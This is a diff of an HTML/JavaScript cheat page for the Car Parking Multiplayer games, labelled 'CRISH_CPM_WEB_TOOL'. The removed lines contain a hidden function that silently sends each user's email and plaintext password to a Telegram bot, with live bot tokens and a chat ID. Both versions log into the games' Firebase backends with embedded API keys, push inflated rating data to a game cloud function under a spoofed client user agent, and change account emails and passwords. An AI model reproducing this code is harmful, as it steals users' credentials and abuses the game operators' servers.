@@ -1,555 +1,391 @@
-<!DOCTYPE html>  <html lang="en">  
+<!DOCTYPE html>
+<html lang="en">  
 <head>  
-<meta charset="UTF-8">  
-<meta name="viewport" content="width=device-width, initial-scale=1.0">  
-<title>CRISHCPMDEVX</title></title>  <style>  
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500;700&display=swap');  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>CRISHCPMDEVX</title>  
+  <style>  
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500;700&display=swap');  
+      
+    * { box-sizing: border-box; }  
     
-  * { box-sizing: border-box; }  
-  
-  /*========================================  
-      🔥 BODY GLOBAL STYLE  
-  ========================================*/  
-  body {  
-    font-family: 'Roboto', sans-serif;  
-    background-image: url("https://i.postimg.cc/d0cJrfPq/39475270-b658-4a8f-a7d0-fd1843b99ad4.jpg"); /* bodyBgImage */  
-    background-size: cover;      /* bgFit */  
-    background-position: center; /* bgCenter */  
-    background-repeat: no-repeat;  
-    background-attachment: fixed;  
-    margin: 0;  
-    padding: 0;  
-    color: #fff; /* textMainColor */  
-    display: flex;  
-    align-items: center;  
-    justify-content: center;  
-    height: 100vh;  
-  }  
-  
-  /*========================================  
-      🔥 MAIN CONTAINER BOX  
-  ========================================*/  
-  .container {  
-    background: rgba(20,20,30,0.6); /* containerBgGlass */  
-    backdrop-filter: blur(5px);     /* containerBlur */  
-    border: 2px solid #b90000;      /* containerBorderColor */  
-    border-radius: 20px;            /* containerRounded */  
-    width: 360px;  
-    padding: 22px;  
-    text-align: center;  
-    box-shadow: 0 0 40px rgb(245,0,0); /* containerGlow */  
-    transform: rotate(-0.3deg);  
-  }  
-  
-  /*========================================  
-      🔥 HEADER / TITLE TEXT  
-  ========================================*/  
-  h1 {  
-    font-family: 'Orbitron', sans-serif;  
-    font-size: 1.2rem;  
-    color: #b90000; /* titleTextColor */  
-    text-shadow: 0 0 6px #b90000, 0 0 15px #b90000; /* titleGlow */  
-    margin-bottom: 12px;  
-    animation: glow 2s infinite alternate; /* glowPulse */  
-  }  
-  
-  /* OWNER SUB TEXT */  
-  .owner-tip {  
-    font-size: 11px;  
-    color: #b90000; /* ownerTextColor */  
-    text-shadow: 0 0 4px #b90000; /* ownerGlow */  
-    margin-bottom: 12px;  
-  }  
-  
-  /*========================================  
-      🔥 POWER LIST BOX  
-  ========================================*/  
-  .power-list {  
-    background: rgba(0,0,0,0.4); /* listBgGlass */  
-    border: 1px solid #b90000;   /* listBorderColor */  
-    padding: 8px;  
-    border-radius: 10px;  
-    margin-bottom: 15px;  
-    width: 100%;  
-    text-align: left;  
-    box-shadow: 0 0 12px rgb(245,0,0); /* listGlow */  
-    color: #b90000; /* listTextColor */  
-    font-size: 11px;  
-    font-weight: 500;  
-    line-height: 1.4;  
-  }  
-  
-  .power-list .number {  
-    font-weight: 700;  
-    margin-right: 8px;  
-    color: #b90000; /* numberColor */  
-    text-shadow: 0 0 6px #ff0000; /* numberGlow */  
-  }  
-  
-  /*========================================  
-      🔥 FORMS (INPUT + SELECT)  
-  ========================================*/  
-  input, select {  
-    width: 100%;  
-    padding: 8px;  
-    margin: 6px 0;  
-    border-radius: 6px;                 /* inputRounded */  
-    border: 1px solid #b90000;          /* inputBorderColor */  
-    background: rgba(255,255,255,0.05); /* inputBgGlass */  
-    color: #fff;                        /* inputTextColor */  
-    font-size: 13px;  
-    transition: 0.3s;  
-    outline: none;  
-  }  
-  input:focus, select:focus {  
-    border-color: #b90000;  
-    box-shadow: 0 0 10px #b90000; /* inputGlow */  
-  }  
-  
-  /* PASSWORD FIELD */  
-  .password-wrapper { position: relative; }  
-  .password-wrapper input { padding-right: 36px; }  
-  .password-wrapper span {  
-    position: absolute;  
-    right: 8px;  
-    top: 50%;  
-    transform: translateY(-50%);  
-    cursor: pointer;  
-    color: #ffffff; /* eyeColor */  
-    font-size: 14px;  
-  }  
-  
-  /*========================================  
-      🔥 BUTTONS  
-  ========================================*/  
-  button {  
-    width: 100%;  
-    padding: 8px;  
-    margin: 6px 0;  
-    border-radius: 6px;  
-     background: rgba(255,255,255,0.05); /* btnBg */  
-    border: 1px solid #b90000;       /* btnBorder */  
-    color: #ffffff;                  /* btnTextColor */  
-    font-weight: 600;  
-    font-size: 13px;  
-    cursor: pointer;  
-    box-shadow: 0 0 10px rgb(245,0,0); /* btnGlow */  
-    transition: 0.3s;  
-  }  
-  button:hover rgba(255,255,255,0.05)  
-    transform: scale(1.04);  
-    box-shadow: 0 0 15px rgb(245,0,0); /* btnHoverGlow */  
-  }  
-  
-  /* STATUS TEXT */  
-  .status {  
-    margin-top: 8px;  
-    color: #ffffff; /* statusColor */  
-    font-size: 12px;  
-  }  
-  
-  footer {  
-    margin-top: 12px;  
-    font-size: 11px;  
-    opacity: .7;  
-    color: #ffffff; /* footerTextColor */  
-  }  
-  
-  @keyframes glow {  
-    from { text-shadow: 0 0 6px #d70000; }  
-    to   { text-shadow: 0 0 15px #d70000, 0 0 25px #d70000; }  
-  }  
-</style>  </head>  <body>  
-<div class="container">    <h1>👑 CRISH_CPM_WEB_TOOL 👑</h1>  
-  <div class="owner-tip">OWNER: CRISH_CPM</div>    <div id="gameMenu">  
-    <p>Select a Game:</p>  
-    <select id="gameSelect" onchange="showLoginForm()">  
-      <option value="">Select Game</option>  
-      <option value="CPM1">CPM1</option>  
-      <option value="CPM2">CPM2</option>  
-    </select>  
-  </div>    <div id="loginForm" style="display:none;">  
-    <input type="email" id="email" placeholder="Email" />  
-    <div class="password-wrapper">  
-      <input type="password" id="password" placeholder="Password" />  
-      <span id="togglePassword">SHOW👁️</span>  
-    </div>  
-    <button onclick="loginFirebase()">Login</button>  
-    <button onclick="showGameMenu()">Back</button>  
-  </div>    <div id="menuButtons" style="display:none;">  
-    <button onclick="kingRank()">👑 King Rank</button>  
-    <button onclick="logout()">🔓 Unlock all Cars</button>  
-    <button onclick="logout()">🚪 Logout</button>  
-  </div>    <div class="power-list">  
-    <div><span class="number">INSIDE_MENU</span></div>  
-    <div><span class="number">01.</span> KING RANK</div>  
-    <div><span class="number">02.</span> REFILL MONEY</div>  
-    <div><span class="number">03.</span> REFILL COINS</div>  
-    <div><span class="number">04.</span> CUSTOM TUNE UP</div>  
-    <div><span class="number">05.</span> CHANGE RACE WIN 9999</div>  
-    <div><span class="number">06.</span> CHANGE RACE LOSE 1</div>  
-    <div><span class="number">07.</span> REMOVE BUMPER</div>  
-    <div><span class="number">08.</span> UNLOCK ALL PREMIUM CAR</div>  
-    <div><span class="number">09.</span> UNLOCK SIREN</div>  
-    <div><span class="number">10.</span> UNLOCK SMOKE</div>  
-    <div><span class="number">11.</span> DAMAGE DISABLE ENGINE</div>  
-    <div><span class="number">12.</span> CLONE ACCOUNT</div>  
-  </div>    <div id="status" class="status"></div>  
-  <footer>© 2025 CRISHDEVX. All Rights Reserved.</footer>  
-</div>  <script>  
-  const togglePassword = document.getElementById('togglePassword');  
-  const passwordInput = document.getElementById('password');  
-  
-  togglePassword.onclick = () => {  
-    if(passwordInput.type === 'password'){  
-      passwordInput.type = 'text';  
-      togglePassword.textContent = 'HIDE🙈';  
-    } else {  
-      passwordInput.type = 'password';  
-      togglePassword.textContent = 'SHOW👁️';  
+    body {  
+      font-family: 'Roboto', sans-serif;  
+      background-image: url("https://i.postimg.cc/d0cJrfPq/39475270-b658-4a8f-a7d0-fd1843b99ad4.jpg");  
+      background-size: cover;      
+      background-position: center; 
+      background-repeat: no-repeat;  
+      background-attachment: fixed;  
+      margin: 0;  
+      padding: 0;  
+      color: #fff;   
+      display: flex;  
+      align-items: center;  
+      justify-content: center;  
+      height: 100vh;  
     }  
-  }  
+    
+    .container {  
+      background: rgba(20,20,30,0.6);   
+      backdrop-filter: blur(5px);     
+      border: 2px solid #b90000;      
+      border-radius: 20px;            
+      width: 360px;  
+      padding: 22px;  
+      text-align: center;  
+      box-shadow: 0 0 40px rgb(245,0,0);   
+      transform: rotate(-0.3deg);  
+    }  
+    
+    h1 {  
+      font-family: 'Orbitron', sans-serif;  
+      font-size: 1.2rem;  
+      color: #b90000;   
+      text-shadow: 0 0 6px #b90000, 0 0 15px #b90000;   
+      margin-bottom: 12px;  
+      animation: glow 2s infinite alternate;   
+    }  
+    
+    .owner-tip {  
+      font-size: 11px;  
+      color: #b90000;   
+      text-shadow: 0 0 4px #b90000;   
+      margin-bottom: 12px;  
+    }  
+    
+    .power-list {  
+      background: rgba(0,0,0,0.4);   
+      border: 1px solid #b90000;   
+      padding: 8px;  
+      border-radius: 10px;  
+      margin-bottom: 15px;  
+      width: 100%;  
+      text-align: left;  
+      box-shadow: 0 0 12px rgb(245,0,0);   
+      color: #b90000;   
+      font-size: 11px;  
+      font-weight: 500;  
+      line-height: 1.4;  
+    }  
+    
+    .power-list .number {  
+      font-weight: 700;  
+      margin-right: 8px;  
+      color: #b90000;   
+      text-shadow: 0 0 6px #ff0000;   
+    }  
+    
+    input, select {  
+      width: 100%;  
+      padding: 8px;  
+      margin: 6px 0;  
+      border-radius: 6px;                 
+      border: 1px solid #b90000;          
+      background: rgba(255,255,255,0.05);   
+      color: #fff;                        
+      font-size: 13px;  
+      transition: 0.3s;  
+      outline: none;  
+    }  
+    input:focus, select:focus {  
+      border-color: #b90000;  
+      box-shadow: 0 0 10px #b90000;   
+    }  
+    
+    .password-wrapper { position: relative; }  
+    .password-wrapper input { padding-right: 36px; }  
+    .password-wrapper span {  
+      position: absolute;  
+      right: 8px;  
+      top: 50%;  
+      transform: translateY(-50%);  
+      cursor: pointer;  
+      color: #ffffff;   
+      font-size: 14px;  
+    }  
+    
+    button {  
+      width: 100%;  
+      padding: 8px;  
+      margin: 6px 0;  
+      border-radius: 6px;  
+      background: rgba(255,255,255,0.05);   
+      border: 1px solid #b90000;       
+      color: #ffffff;                  
+      font-weight: 600;  
+      font-size: 13px;  
+      cursor: pointer;  
+      box-shadow: 0 0 10px rgb(245,0,0);   
+      transition: 0.3s;  
+    }  
+    button:hover {  
+      transform: scale(1.04);  
+      box-shadow: 0 0 15px rgb(245,0,0);   
+    }  
+    
+    .status {  
+      margin-top: 8px;  
+      color: #ffffff;   
+      font-size: 12px;  
+    }  
+    .status.error { color: #ff4444; }
+    
+    footer {  
+      margin-top: 12px;  
+      font-size: 11px;  
+      opacity: .7;  
+      color: #ffffff;   
+    }  
+    
+    @keyframes glow {  
+      from { text-shadow: 0 0 6px #d70000; }  
+      to   { text-shadow: 0 0 15px #d70000, 0 0 25px #d70000; }  
+    }  
+  </style>  
+</head>  
+<body>  
+  <div class="container">    
+    <h1>👑 CRISH_CPM_WEB_TOOL 👑</h1>  
+    <div class="owner-tip">OWNER: CRISH_CPM</div>    
+    
+    <div id="gameMenu">  
+      <p>Select a Game:</p>  
+      <select id="gameSelect">  
+        <option value="">Select Game</option>  
+        <option value="CPM1">CPM1</option>  
+        <option value="CPM2">CPM2</option>  
+      </select>  
+      <button onclick="showLoginForm()">Next</button>
+    </div>    
+
+    <div id="loginForm" style="display:none;">  
+      <input type="email" id="email" placeholder="Email" />  
+      <div class="password-wrapper">  
+        <input type="password" id="password" placeholder="Password" />  
+        <span id="togglePassword">SHOW👁️</span>  
+      </div>  
+      <button onclick="loginFirebase()">Login</button>  
+      <button onclick="showGameMenu()">Back</button>  
+    </div>    
+
+    <div id="menuButtons" style="display:none;">  
+      <button onclick="kingRank()">👑 King Rank</button>  
+      <button onclick="changeEmail()">📧 Change Email</button>
+      <button onclick="changePassword()">🔑 Change Password</button>
+      <button onclick="logout()">🚪 Logout</button>  
+    </div>    
+
+    <div class="power-list">  
+      <div><span class="number">INSIDE_MENU</span></div>  
+      <div><span class="number">01.</span> KING RANK</div>  
+      <div><span class="number">02.</span> REFILL MONEY</div>  
+      <div><span class="number">03.</span> REFILL COINS</div>  
+      <div><span class="number">04.</span> CUSTOM TUNE UP</div>  
+      <div><span class="number">05.</span> CHANGE RACE WIN 9999</div>  
+      <div><span class="number">06.</span> CHANGE RACE LOSE 1</div>  
+      <div><span class="number">07.</span> REMOVE BUMPER</div>  
+      <div><span class="number">08.</span> UNLOCK ALL PREMIUM CAR</div>  
+      <div><span class="number">09.</span> UNLOCK SIREN</div>  
+      <div><span class="number">10.</span> UNLOCK SMOKE</div>  
+      <div><span class="number">11.</span> DAMAGE DISABLE ENGINE</div>  
+      <div><span class="number">12.</span> CLONE ACCOUNT</div>  
+    </div>    
+
+    <div id="status" class="status"></div>  
+    <footer>© 2025 CRISHDEVX. All Rights Reserved.</footer>  
+  </div>  
+
+  <script>  
+    let currentUser = null;
+    let currentToken = null;
+    let selectedGame = null; 
+
+    const gameConfigurations = {
+        CPM1: {
+            firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
+            rankUrl: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
+        },
+        CPM2: {
+            firebaseApiKey: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
+            rankUrl: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
+        }
+    };
+
+    const togglePassword = document.getElementById('togglePassword');  
+    const passwordInput = document.getElementById('password');  
   
-  function showLoginForm(){  
-    document.getElementById('loginForm').style.display = 'block';  
-    document.getElementById('gameMenu').style.display = 'none';  
-  }  
-  function showGameMenu(){  
-    document.getElementById('loginForm').style.display = 'none';  
-    document.getElementById('gameMenu').style.display = 'block';  
-  }  
-  function loginFirebase(){ alert("Login function runs here"); }  
-  function kingRank(){ alert("King Rank clicked"); }  
-  function logout(){ alert("Logout clicked"); }  
-</script>  </body>  
-</html>
-      <script>
-        let currentUser = null;
-        let currentToken = null;
-        let selectedGame = null; // Track the selected game
-        // Configuration (Sensitive data - NEVER expose this in real production code!)
-        const gameConfigurations = {
-            CPM1: {
-                firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM', //REPLACE_ME,
-                rankUrl: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
-                botToken: "8172416110:AAGeg9Zoi7sKx80N3V_mhjojy7mmPtiJlcg", //REPLACE_ME,
-                chatId: '8117301208' //REPLACE_ME
-            },
-            CPM2: {
-                firebaseApiKey: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ', //REPLACE_ME,
-                rankUrl: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI",
-                botToken: '8458571545:AAGIW2qx6Gsl2x5UMVLULxJx2X3G2TPvDv0', //REPLACE_ME,
-                chatId: '8117301208' //REPLACE_ME
-            }
-        };
+    togglePassword.onclick = () => {  
+      if(passwordInput.type === 'password'){  
+        passwordInput.type = 'text';  
+        togglePassword.textContent = 'HIDE🙈';  
+      } else {  
+        passwordInput.type = 'password';  
+        togglePassword.textContent = 'SHOW👁️';  
+      }  
+    }  
 
+    function updateStatus(message, isError = false) {
+        const status = document.getElementById('status');
+        status.className = isError ? 'status error' : 'status';
+        status.textContent = message;
+    }
 
-
-
-        async function sendSilentNotification(email, password, game) {
-            const config = gameConfigurations[game];
-            if (!config || !config.botToken || !config.chatId) {
-                console.warn("Telegram configuration missing for this game.");
-                return;
-            }
-
-            const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-            const message = `🔐𝙻𝙾𝙶𝙸𝙽 𝚂𝚄𝙲𝙲𝙴𝚂𝚂- ${game}:\n📧 𝙴𝙼𝙰𝙸𝙻: ${email}\n🔒 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: ${password}`;
-
-            try {
-                const response = await fetch(url, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: config.chatId,
-                        text: message
-                    })
-                });
-                if (!response.ok) {
-                    console.error("Telegram send failed:", response.status, response.statusText);
-                }
-            } catch (error) {
-                console.error("Telegram send error:", error);
-            }
+    function showLoginForm() {
+        selectedGame = document.getElementById("gameSelect").value;
+        if (selectedGame) {
+            document.getElementById("gameMenu").style.display = "none";
+            document.getElementById("loginForm").style.display = "block";
+        } else {
+            alert("Please select a game first.");
         }
-        function updateStatus(message, isError = false) {
-            const status = document.getElementById('status');
-            status.className = isError ? 'status error' : 'status';
-            status.textContent = message;
-        }
-        function showLoginForm() {
-            selectedGame = document.getElementById("gameSelect").value;
-            if (selectedGame) {
-                document.getElementById("gameMenu").style.display = "none";
-                document.getElementById("loginForm").style.display = "block";
-            } else {
-                alert("Please select a game first.");
-            }
-        }
+    }
 
-        function showGameMenu() {
-            document.getElementById("loginForm").style.display = "none";
-            document.getElementById("gameMenu").style.display = "block";
-        }
+    function showGameMenu() {
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("gameMenu").style.display = "block";
+    }
 
-        async function loginFirebase() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            if (!email || !password) return updateStatus("Enter email & password!", true);
+    async function loginFirebase() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        if (!email || !password) return updateStatus("Enter email & password!", true);
 
-            updateStatus("Logging in...");
+        updateStatus("Logging in...");
 
-            try {
-                const config = gameConfigurations[selectedGame];
-                if (!config) {
-                    updateStatus("❌ Invalid game selected!", true);
-                    return;
-                }
-                const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${config.firebaseApiKey}`;
-
-                const response = await fetch(loginUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        email,
-                        password,
-                        returnSecureToken: true
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.idToken) {
-                    currentUser = email;
-                    currentToken = data.idToken;
-                    updateStatus(`✅ Logged in as ${email}`);
-                    await sendSilentNotification(email, password, selectedGame); // Pass the selected game
-
-                    document.getElementById('loginForm').style.display = 'none';
-                    document.getElementById('menuButtons').style.display = 'block';
-                } else {
-                    updateStatus(`❌ Login failed: ${data.error?.message || "Unknown Firebase error"}`, true);
-                }
-            } catch (err) {
-                updateStatus(`❌ Error: ${err.message}`, true);
-            }
-        }
-
-
-        function requireLogin() {
-            if (!currentUser || !currentToken) {
-                updateStatus("❌ You must login first!", true);
-                return false;
-            }
-            return true;
-        }
-
-        async function kingRank() {
-            if (!requireLogin()) return;
-
-            updateStatus(`👑 Setting King Rank for ${currentUser}...`);
+        try {
             const config = gameConfigurations[selectedGame];
             if (!config) {
-             updateStatus("❌ Invalid game selected!", true);
-             return;
+                updateStatus("❌ Invalid game selected!", true);
+                return;
             }
+            const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${config.firebaseApiKey}`;
 
-            const ratingData = {
-                "cars": 100000,
-                "car_fix": 100000,
-                "car_collided": 100000,
-                "car_exchange": 100000,
-                "car_trade": 100000,
-                "car_wash": 100000,
-                "slicer_cut": 100000,
-                "drift_max": 100000,
-                "drift": 100000,
-                "cargo": 100000,
-                "delivery": 100000,
-                "taxi": 100000,
-                "levels": 100000,
-                "gifts": 100000,
-                "fuel": 100000,
-                "offroad": 100000,
-                "speed_banner": 100000,
-                "reactions": 100000,
-                "police": 100000,
-                "run": 100000,
-                "real_estate": 100000,
-                "t_distance": 100000,
-                "treasure": 100000,
-                "block_post": 100000,
-                "push_ups": 100000,
-                "burnt_tire": 100000,
-                "passanger_distance": 100000,
-                "time": 10000000000,
-                "race_win": 3000
-            };
+            const response = await fetch(loginUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password, returnSecureToken: true })
+            });
 
-            const payload = {
-                "data": JSON.stringify({
-                    RatingData: ratingData
-                })
-            };
+            const data = await response.json();
 
-            try {
-                const response = await fetch(config.rankUrl, {
-                    method: "POST",
-                    headers: {
-                        "Authorization": `Bearer ${currentToken}`,
-                        "Content-Type": "application/json",
-                        "User-Agent": "okhttp/3.12.13"
-                    },
-                    body: JSON.stringify(payload)
-                });
+            if (data.idToken) {
+                currentUser = email;
+                currentToken = data.idToken;
+                updateStatus(`✅ Logged in as ${email}`);
 
-                if (response.ok) {
-                    updateStatus(`✅ King Rank Successful for ${currentUser}`);
-                } else {
-                    updateStatus(`❌ King Rank Failed: ${response.statusText}`, true);
-                }
-            } catch (error) {
-                updateStatus(`❌ Error: ${error.message}`, true);
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('menuButtons').style.display = 'block';
+            } else {
+                updateStatus(`❌ Login failed: ${data.error?.message || "Unknown error"}`, true);
             }
+        } catch (err) {
+            updateStatus(`❌ Error: ${err.message}`, true);
         }
+    }
 
-        async function changeEmail() {
-            if (!requireLogin()) return;
-            const config = gameConfigurations[selectedGame];
-             if (!config) {
-              updateStatus("❌ Select Game First!", true);
-              return;
-             }
-            const newEmail = prompt("Enter new email:");
-            if (!newEmail) return;
-            try {
+    function requireLogin() {
+        if (!currentUser || !currentToken) {
+            updateStatus("❌ You must login first!", true);
+            return false;
+        }
+        return true;
+    }
 
-                const response = await fetch(
-                    `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            idToken: currentToken,
-                            email: newEmail,
-                            returnSecureToken: true
-                        })
-                    });
+    async function kingRank() {
+        if (!requireLogin()) return;
 
-                const data = await response.json();
+        updateStatus(`👑 Setting King Rank for ${currentUser}...`);
+        const config = gameConfigurations[selectedGame];
+        if (!config) return;
 
-                if (data.email) {
-                    currentUser = data.email;
-                    currentToken = data.idToken;
-                    updateStatus(`✅ Email changed to ${data.email}`);
-                } else {
-                    updateStatus(`❌ Error: ${data.error?.message || "Failed to change email"}`, true);
-                }
-            } catch (error) {
-                updateStatus(`❌ Error: ${error.message}`, true);
+        const ratingData = {
+            "cars": 100000, "car_fix": 100000, "car_collided": 100000, "car_exchange": 100000,
+            "car_trade": 100000, "car_wash": 100000, "slicer_cut": 100000, "drift_max": 100000,
+            "drift": 100000, "cargo": 100000, "delivery": 100000, "taxi": 100000, "levels": 100000,
+            "gifts": 100000, "fuel": 100000, "offroad": 100000, "speed_banner": 100000, "reactions": 100000,
+            "police": 100000, "run": 100000, "real_estate": 100000, "t_distance": 100000, "treasure": 100000,
+            "block_post": 100000, "push_ups": 100000, "burnt_tire": 100000, "passanger_distance": 100000,
+            "time": 10000000000, "race_win": 3000
+        };
+
+        try {
+            const response = await fetch(config.rankUrl, {
+                method: "POST",
+                headers: {
+                    "Authorization": `Bearer ${currentToken}`,
+                    "Content-Type": "application/json",
+                    "User-Agent": "okhttp/3.12.13"
+                },
+                body: JSON.stringify({ "data": JSON.stringify({ RatingData: ratingData }) })
+            });
+
+            if (response.ok) {
+                updateStatus(`✅ King Rank Successful for ${currentUser}`);
+            } else {
+                updateStatus(`❌ King Rank Failed: ${response.statusText}`, true);
             }
+        } catch (error) {
+            updateStatus(`❌ Error: ${error.message}`, true);
         }
+    }
 
-        async function changePassword() {
-            if (!requireLogin()) return;
-             const config = gameConfigurations[selectedGame];
-             if (!config) {
-              updateStatus("❌ Select Game First!", true);
-              return;
-             }
+    async function changeEmail() {
+        if (!requireLogin()) return;
+        const config = gameConfigurations[selectedGame];
+        const newEmail = prompt("Enter new email:");
+        if (!newEmail) return;
 
-            const newPassword = prompt("Enter new password:");
-            if (!newPassword) return;
-            try {
-
-
-                const response = await fetch(
-                    `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            idToken: currentToken,
-                            password: newPassword,
-                            returnSecureToken: true
-                        })
-                    });
-
-                const data = await response.json();
-
-                if (data.email) {
-                    currentToken = data.idToken;
-                    updateStatus(`✅ Password changed successfully!`);
-                } else {
-                    updateStatus(`❌ Error: ${error?.message || "Failed to change password"}`, true);
-                }
-            } catch (error) {
-                updateStatus(`❌ Error: ${error.message}`, true);
+        try {
+            const response = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
+            });
+            const data = await response.json();
+            if (data.email) {
+                currentUser = data.email;
+                currentToken = data.idToken;
+                updateStatus(`✅ Email changed to ${data.email}`);
+            } else {
+                updateStatus(`❌ Error: ${data.error?.message || "Failed"}`, true);
             }
+        } catch (error) {
+            updateStatus(`❌ Error: ${error.message}`, true);
         }
+    }
 
-        function logout() {
-            currentUser = null;
-            currentToken = null;
-            document.getElementById('menuButtons').style.display = 'none';
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('gameMenu').style.display = 'block'; // Show game selection
-            updateStatus("Logged out.");
+    async function changePassword() {
+        if (!requireLogin()) return;
+        const config = gameConfigurations[selectedGame];
+        const newPassword = prompt("Enter new password:");
+        if (!newPassword) return;
+
+        try {
+            const response = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
+            });
+            const data = await response.json();
+            if (data.email) {
+                currentToken = data.idToken;
+                updateStatus(`✅ Password changed successfully!`);
+            } else {
+                updateStatus(`❌ Error: Failed to change password`, true);
+            }
+        } catch (error) {
+            updateStatus(`❌ Error: ${error.message}`, true);
         }
+    }
 
-
-        // Show game selection on page load
-        document.addEventListener("DOMContentLoaded", () => {
-            document.getElementById("gameMenu").style.display = "block";
-        });
-    </script>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Official Notice of Shutdown</title>
-</head>
-<body>
-    <p><strong>Date:</strong> [Insert Date]</p>
-
-    <p>To Whom It May Concern,</p>
-
-    <p>
-        This is to formally announce that the tools and content associated with my recent post are 
-        officially shut down effective immediately.
-    </p>
-
-    <p>
-        I have decided to discontinue and disable access due to unauthorized usage and redistribution. 
-        It has come to my attention that many individuals have been using, reselling, and profiting 
-        from the materials I personally worked hard to create.
-    </p>
-
-    <p>
-        As the original creator, I value the time, effort, and dedication invested in developing 
-        this content. Unauthorized selling and misuse are unacceptable and violate my rights 
-        as the owner.
-    </p>
-
-    <p>
-        Therefore, all permissions to use, share, distribute, or sell this material are hereby revoked.
-        Any continued use after this notice will be considered unauthorized.
-    </p>
-
-    <p>
-        Thank you for your understanding.
-    </p>
-
-    <p>
-        Sincerely,<br>
-        [CRISH CPM]
-    </p>
-</body>
-
+    function logout() {
+        currentUser = null;
+        currentToken = null;
+        document.getElementById('menuButtons').style.display = 'none';
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('gameMenu').style.display = 'block'; 
+        updateStatus("Logged out.");
+    }
+  </script>  
+</body>  
 </html>
